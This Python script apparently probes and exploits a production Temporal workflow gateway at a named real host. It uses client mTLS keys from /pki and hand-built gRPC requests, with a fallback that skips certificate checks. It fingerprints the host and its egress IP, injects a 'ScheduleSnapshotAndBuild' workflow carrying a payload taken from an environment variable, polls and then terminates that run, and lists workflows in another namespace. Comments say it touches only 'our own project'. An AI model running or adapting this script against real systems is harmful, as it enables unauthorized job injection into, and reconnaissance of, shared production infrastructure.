#!/usr/bin/env python3
# i69361: datapacket builder vantage re-check with single-cert CA PEM, then (if positive)
# deliver ONE ScheduleSnapshotAndBuild for OUR OWN project and replay history up to 300s.
import subprocess, struct, json, sys, os, time, re, uuid, hashlib, base64

G = 'https://external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
SNI = 'external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'
CA = '/pki/server-ca-bundle.crt'
CRT = '/pki/client.crt'
KEY = '/pki/client.key'
TS = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
CTR = [0]
T = '/temporal.api.workflowservice.v1/WorkflowService/'
BUDGET = [60000]
NS = 'builds'
QUEUE = 'orchestrator'

OUR_P = '104cdfa2-f46b-45ed-b2b9-ec4db24b1b3f'
OUR_E = '6bd910b8-f1f5-43e5-b497-5bc2a4c55e3d'
OUR_S = '185f72a5-3373-41c1-982c-2af89c6e1191'


def varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            return bytes(out)


def fv(f, n):
    return varint(f << 3) + varint(n)


def fb(f, b):
    return varint((f << 3) | 2) + varint(len(b)) + b


def fs(f, s):
    return fb(f, s.encode() if isinstance(s, str) else s)


def fmsg(f, m):
    return fb(f, m)


def rd_varint(b, i):
    r = 0
    s = 0
    while i < len(b):
        x = b[i]
        r |= (x & 0x7f) << s
        i += 1
        if not x & 0x80:
            return r, i
        s += 7
    raise ValueError('varint')


def parse(b):
    i = 0
    out = []
    while i < len(b):
        k, i = rd_varint(b, i)
        f = k >> 3
        w = k & 7
        if f == 0:
            raise ValueError('f0')
        if w == 0:
            v, i = rd_varint(b, i)
            out.append((f, 0, v))
        elif w == 2:
            l, i = rd_varint(b, i)
            if i + l > len(b):
                raise ValueError('len')
            out.append((f, 2, b[i:i + l])); i += l
        elif w == 5:
            out.append((f, 5, b[i:i + 4])); i += 4
        elif w == 1:
            out.append((f, 1, b[i:i + 8])); i += 8
        else:
            raise ValueError('wt%d' % w)
    return out


def call(path, body=b'', timeout=25, insecure=False):
    CTR[0] += 1
    base = '/pki/w%d' % CTR[0]
    fu, hu, bu = base + '.in', base + '.hdr', base + '.out'
    open(fu, 'wb').write(b'\x00' + struct.pack('>I', len(body)) + body)
    args = ['curl', '-sS', '--http2', '--connect-timeout', '8', '-m', str(timeout), '-D', hu, '-o', bu,
            '--cert', CRT, '--key', KEY]
    if insecure:
        args += ['-k']
    else:
        args += ['--cacert', CA]
    args += ['-X', 'POST', G + path,
            '-H', 'te: trailers', '-H', 'content-type: application/grpc', '--data-binary', '@' + fu]
    t0 = time.time()
    prc = subprocess.run(args, capture_output=True, text=True)
    dt = round(time.time() - t0, 2)
    rc = prc.returncode
    if rc != 0:
        print('CURL|%s|rc=%s|%s' % (path.split('/')[-1], rc, (prc.stderr or '').strip()[:300]), flush=True)
    hdr = ''
    try:
        hdr = open(hu, 'rb').read().decode('utf-8', 'replace')
    except Exception:
        pass
    sts = re.findall(r'grpc-status:\s*(\d+)', hdr)
    msgs = re.findall(r'grpc-message:\s*([^\r\n]*)', hdr)
    data = open(bu, 'rb').read() if os.path.exists(bu) else b''
    for f in (fu, hu, bu):
        try:
            os.unlink(f)
        except Exception:
            pass
    return {'rc': rc, 'st': (sts[-1] if sts else '-'), 'msg': (msgs[-1].strip()[:200] if msgs else ''),
            'n': len(data), 'data': data, 'dt': dt, 'hdr': hdr[:400]}


def payload(b):
    if len(b) >= 5 and b[0] == 0:
        l = struct.unpack('>I', b[1:5])[0]
        return b[5:5 + l]
    return b


def out(s):
    if BUDGET[0] <= 0:
        return
    s = s[:BUDGET[0]]
    BUDGET[0] -= len(s)
    print(s, flush=True)


def get1(b, field):
    try:
        for f, w, v in parse(b):
            if f == field and w == 2:
                return v
    except Exception:
        return None


def all_of(b, field):
    try:
        return [v for f, w, v in parse(b) if f == field and w == 2]
    except Exception:
        return []


def pl_strings(b, lim=400):
    try:
        return ' '.join(x.decode('utf-8', 'replace') for x in re.findall(rb'[\x20-\x7e]{4,}', b))[:lim]
    except Exception:
        return ''


def dur(sec):
    return fv(1, sec)


def exec_msg(wid, rid=''):
    return fs(1, wid) + (fs(2, rid) if rid else b'')


def build_payload(js):
    meta = fmsg(1, fs(1, 'encoding') + fs(2, 'json/protobuf')) + \
           fmsg(1, fs(1, 'messageType') + fs(2, 'orchestrator.StartSnapshotAndBuildRequest'))
    return meta + fmsg(2, js)


def start_body(ns, wid, wtype, tq, inp, etime=180, rtime=300, wtime=30):
    data = json.dumps(inp, separators=(',', ':')).encode()
    b = fs(1, ns) + fs(2, wid) + fmsg(3, fs(1, wtype)) + fmsg(4, fs(1, tq))
    b += fmsg(5, fmsg(1, build_payload(data)))
    b += fmsg(6, dur(etime)) + fmsg(7, dur(rtime)) + fmsg(8, dur(wtime))
    b += fs(9, 'i69361-probe') + fs(10, str(uuid.uuid4())) + fv(11, 2)
    return b


def runid_of(r):
    if r['st'] != '0':
        return ''
    try:
        for f, w, v in parse(payload(r['data'])):
            if f == 1 and w == 2:
                return v.decode()
    except Exception:
        pass
    return ''


def hist(wid, rid, wait=25):
    req = fs(1, NS) + fmsg(2, exec_msg(wid, rid)) + fv(3, 80)
    r = call(T + 'GetWorkflowExecutionHistory', req, timeout=wait)
    if r['st'] != '0':
        return None, None, r
    pl = payload(r['data'])
    h = get1(pl, 1) or b''
    evs = all_of(h, 1)
    seq = []
    for ev in evs:
        et = [v for f, w, v in parse(ev) if f == 3 and w == 0]
        seq.append(et[0] if et else 0)
    return seq, evs, r


def terminate(wid, rid, why):
    r = call(T + 'TerminateWorkflowExecution',
             fs(1, NS) + fmsg(2, exec_msg(wid, rid)) + fs(3, why) + fs(5, 'i69361') + fs(6, rid), timeout=25)
    out('TERM|st=%s|m=%s' % (r['st'], r['msg']))
    return r


def ls_wids():
    body = fs(1, NS) + fv(2, 50)
    r = call(T + 'ListWorkflowExecutions', body, timeout=25)
    wids = []
    if r['st'] == '0':
        pl = payload(r['data'])
        for ei in all_of(pl, 1):
            ex = get1(ei, 1) or b''
            wids.append((get1(ex, 1) or b'').decode('utf-8', 'replace'))
    else:
        out('LS_WIDS|st=%s|m=%s' % (r['st'], r['msg']))
    return wids


def ev_tail(evs, lim=600):
    # extract printable strings from last few events (input payloads live there)
    try:
        raw = b''.join(get1(e, 6) or b'' for e in evs[-3:])
        if not raw:
            raw = b''.join(e for e in evs[-2:])
    except Exception:
        raw = b''
    return pl_strings(raw, lim)


def sha256(path):
    try:
        return hashlib.sha256(open(path, 'rb').read()).hexdigest()
    except Exception as e:
        return 'ERR:%r' % (e,)


# ---------------- main ----------------
print('===I69361 START=== ' + TS, flush=True)
out('host=%s' % subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip())
out('kernel=%s' % subprocess.run(['uname', '-r'], capture_output=True, text=True).stdout.strip())
try:
    ip = subprocess.run(['curl', '-sS', '-m', '8', 'https://api.ipify.org'], capture_output=True, text=True).stdout.strip()
    out('EGRESS_IP|%s' % ip)
except Exception as ex:
    out('EGRESS_IP_ERR|%r' % (ex,))

# record PEM/SNI/chain for reuse
out('SNI|%s' % SNI)
for f in (CA, CRT, KEY):
    try:
        out('PKI|%s|len=%d|sha256=%s|head=%s' % (f, os.path.getsize(f),
            sha256(f), open(f).readline().strip()[:40]))
    except Exception as ex:
        out('PKI|%s|ERR|%r' % (f, ex))
for f in (CA, CRT):
    try:
        o1 = subprocess.run(['openssl', 'x509', '-in', f, '-noout', '-subject', '-issuer'],
                            capture_output=True, text=True, timeout=10)
        out('X509|%s|%s' % (os.path.basename(f), ' '.join((o1.stdout or '').split())[:260]))
    except Exception as ex:
        out('X509|%s|ERR|%r' % (os.path.basename(f), ex))
try:
    o = subprocess.run(['openssl', 'crl2pkcs7', '-nocrl', '-certfile', CA],
                       capture_output=True, text=True, timeout=10)
    out('CA_PARSE|rc=%s|%s' % (o.returncode, ((o.stderr or '').strip().splitlines() or ['ok'])[-1][:160]))
except Exception as ex:
    out('CA_PARSE_ERR|%r' % (ex,))

# TLS/SNI handshake probe (single cert CA)
try:
    osr = subprocess.run(['openssl', 's_client', '-connect', '35.247.70.7:443', '-servername', SNI,
                          '-CAfile', CA, '-cert', CRT, '-key', KEY, '-brief'],
                         input='', capture_output=True, text=True, timeout=25)
    t = (osr.stdout or '') + (osr.stderr or '')
    out('SSLC|rc=%s|%s' % (osr.returncode, ' / '.join(x.strip() for x in t.strip().splitlines()[:8])[:400]))
except Exception as ex:
    out('SSLC_ERR|%r' % (ex,))

# ---- ① positive control: GetSystemInfo (<=2 calls) ----
r = call(T + 'GetSystemInfo', timeout=25)
out('CTL|GetSystemInfo|rc=%s|st=%s|m=%s|dt=%s|n=%d' % (r['rc'], r['st'], r['msg'], r['dt'], r['n']))
if r['st'] == '0':
    out('CTL_BODY|' + pl_strings(payload(r['data']), 200))
if r['st'] == '-':
    r2 = call(T + 'GetSystemInfo', timeout=25, insecure=True)
    out('CTL2|GetSystemInfo_insecure|rc=%s|st=%s|m=%s|dt=%s' % (r2['rc'], r2['st'], r2['msg'], r2['dt']))
    if r2['st'] == '0':
        r = r2
if r['st'] != '0':
    out('GATEWAY_UNREACHABLE|st=%s|msg=%s' % (r['st'], r['msg']))
    out('===I69361 END-NOINJECT===')
    sys.exit(0)

out('GATEWAY_OK|proceeding-to-injection')

# ---- ② one ScheduleSnapshotAndBuild to OUR OWN project ----
PL = os.environ.get('I69361_PAYLOAD_B64', '')
try:
    raw = base64.b64decode(PL) if PL else b'{}'
except Exception:
    raw = b'{}'
try:
    pj = json.loads(raw)
except Exception:
    pj = {}
out('PAYLOAD_KEYS|' + ','.join(sorted(pj.keys())))
out('PAYLOAD_SHA|%s' % hashlib.sha256(raw).hexdigest())
PRE = [ls_wids()]
out('PRE_EXECS=%d' % len(PRE[0]))
wid = 'i69361-inject-' + TS

r = call(T + 'StartWorkflowExecution', start_body(NS, wid, 'ScheduleSnapshotAndBuild', QUEUE, pj), timeout=30)
out('START|st=%s|m=%s|n=%d|dt=%s' % (r['st'], r['msg'], r['n'], r['dt']))
rid = runid_of(r)
out('RUNID|%s' % rid)
if not rid:
    out('START_BODY|' + pl_strings(payload(r['data']), 300))
    out('===I69361 END-NORUNID===')
    sys.exit(0)

t0 = time.time()
seq = []
last = []
hit_act = False
hit_fail = False
while time.time() - t0 < 300:
    s, evs, hr = hist(wid, rid)
    if s is not None and s != last:
        seq = s
        last = list(s)
        out('EV|t=%.1f|%s' % (time.time() - t0, ','.join(str(x) for x in s)))
        if 7 in s:
            hit_act = True
        if 6 in s:
            hit_fail = True
    if hit_act or hit_fail:
        break
    if s is not None and 4 in s and (time.time() - t0) > 60 and not hit_act:
        # workflow task executed but no activity within 60s: keep to 90 then break
        if (time.time() - t0) > 90:
            break
    time.sleep(6)

# final capture (tail strings incl. activity input / failure text)
s, evs, hr = hist(wid, rid)
if s is not None:
    seq = s
    out('FINAL_EV|%s' % ','.join(str(x) for x in s))
    tl = ev_tail(evs, 900)
    out('TAIL|' + tl)
    low = tl
    for mk in (OUR_P, 'onepluspadtrading/buildctx-lab', 'i69361', '"rootDirectory"'):
        out('MARK|%s|%s' % (mk, 'YES' if mk in low else 'NO'))
else:
    out('FINAL_HIST_ERR|st=%s|m=%s' % ((hr or {}).get('st'), (hr or {}).get('msg')))

# distinguish: WorkflowTaskFailed(6) with decode error vs ActivityTaskScheduled(7)
if 7 in seq:
    out('JUDGE|ACTIVITY_SCHEDULED|input_controlled=%s' %
        ('YES' if ('onepluspadtrading/buildctx-lab' in (tl if s is not None else '') or 'i69361' in (tl if s is not None else '')) else 'CHECK_TAIL'))
elif 6 in seq:
    out('JUDGE|WORKFLOW_TASK_FAILED_payload_rejected')
else:
    out('JUDGE|NO_ACTIVITY|events=%s' % ','.join(str(x) for x in seq))

# ③ immediate terminate
terminate(wid, rid, 'i69361 done (own project)')
time.sleep(0.8)
s2, evs2, hr2 = hist(wid, rid)
out('POSTTERM_EV|%s' % ','.join(str(x) for x in (s2 or [])))

# minimal read-only listing of other namespaces (skip if budget low) - keep tiny
for ns, lab in (('vm-runtime', 'VMRT'),):
    body = fs(1, ns) + fv(2, 10)
    rr = call(T + 'ListWorkflowExecutions', body, timeout=25)
    n = 0
    types = {}
    if rr['st'] == '0':
        for ei in all_of(payload(rr['data']), 1):
            n += 1
            ty = (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')
            types[ty] = types.get(ty, 0) + 1
    out('LS|%s|st=%s|n=%d|types=%s' % (lab, rr['st'], n, json.dumps(types)[:200]))
out('===I69361 END===')
